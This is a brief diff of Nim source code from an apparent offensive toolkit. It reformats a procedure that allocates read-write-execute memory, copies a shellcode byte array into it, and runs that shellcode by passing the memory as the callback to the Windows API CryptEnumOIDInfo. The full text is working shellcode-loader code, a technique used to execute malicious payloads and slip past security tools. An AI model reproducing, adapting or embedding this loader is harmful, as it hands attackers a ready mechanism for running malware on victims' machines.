@@ -8,12 +8,7 @@ proc cryptEnumOIDInfo[byte](shellcode: openArray[byte]): void =
   let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
   copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
   
-  CryptEnumOIDInfo(
-        cast[DWORD](NULL),
-        cast[DWORD](NULL),
-        cast[PFN_CRYPT_ENUM_OID_INFO](NULL), #yes, you need a null here....
-        cast[PFN_CRYPT_ENUM_OID_INFO](rPtr)
-  )   
+  CryptEnumOIDInfo(cast[DWORD](NULL), cast[DWORD](NULL), cast[PFN_CRYPT_ENUM_OID_INFO](NULL), cast[PFN_CRYPT_ENUM_OID_INFO](rPtr))   
  
 when isMainModule:
   func toByteSeq*(str: string): seq[byte] {.inline.} =
